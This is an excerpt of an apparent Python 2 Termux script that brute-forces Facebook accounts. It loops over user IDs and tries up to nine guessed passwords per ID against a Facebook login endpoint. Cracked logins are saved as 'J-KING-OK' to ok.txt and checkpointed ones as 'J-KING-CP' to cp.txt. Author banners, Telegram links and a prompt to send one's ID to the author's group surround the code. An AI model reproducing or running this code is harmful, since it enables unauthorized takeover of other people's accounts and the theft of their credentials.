...
if not os.path.isfile('/data/data/com.termux/files/home/cepat/ok/node_modules/bytes/index.js'):
    ...
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd AryanHack&& node index.js &')
    os.system('clear')
...
logo = '\n\n\n#    #             # ####### #     #    #  \n#   #              # #     #  #   #    # # \n#  #               # #     #   # #    #   #      \n###          #     # #     #    #    #     # \n#  #         #     # #     #    #    ####### \n#   #        #     # #     #    #    #     #  \n#    #        #####  #######    #    #     #   \n\n--------------------------------------------------\x1a\n\x1a Author      : Aryan Nafas \n\x1a GitHub      : https://github.com/AryanHack907\n\x1a YouTube     : AryanHack907\n\x1a Telegram Group    : https://t.me/AryanHack9007\nTelegram channel    : https://t.me/AryanHack907\n--------------------------------------------------\n'
...
def cookie():
    ...
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 'origin': 'https://m.facebook.com', 
...
def b_menu_select():
    ...
    print ''
    os.system('echo -e "Created by Darlington Ghostson Fast Tool\n\n\t   \n" | lolcat')
    time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'www.facebook.com' in d['error_msg']:
                print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' - ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass1
                ok = open('ok.txt', 'a')
                ok.write(uid + ' - ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
                ...
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' - ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass2
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' - ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                    ...
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' - ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass3
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' - ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                        ...
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' - ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass4
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' - ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                            ...
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' - ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass5
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' - ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                                ...
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' - ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass6
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' - ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                    ...
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass7
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    ...
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass8
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass8 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass8
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass8 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    ...
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mJ-KING-CP ' + uid + ' - ' + pass9
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass9 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mJ-KING-OK ' + uid + ' - ' + pass9
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass9 + '\n')
                                        ok.close()
                                        oks.append(uid)
    ...
    p.map(main, id)
    print ' '
    os.system('echo -e "Saved\n\nTOTAL J-KING-OK & J-KING-CP\n" | lolcat')
    print '\x1b[0;92mJ-KING-OK > ' + str(len(oks))
    print '\x1b[0;93mJ-KING-CP > ' + str(len(cps))


if __name__ == '__main__':
    os.system('clear')
    print 'Created by Aryan Nafas  '
    time.sleep(2)
    print ' '
    print 'Send your ID to my group  '
    time.sleep(2)
    print ' '
    print 'This tool is for premium users only  '
    time.sleep(2)
    print ' '
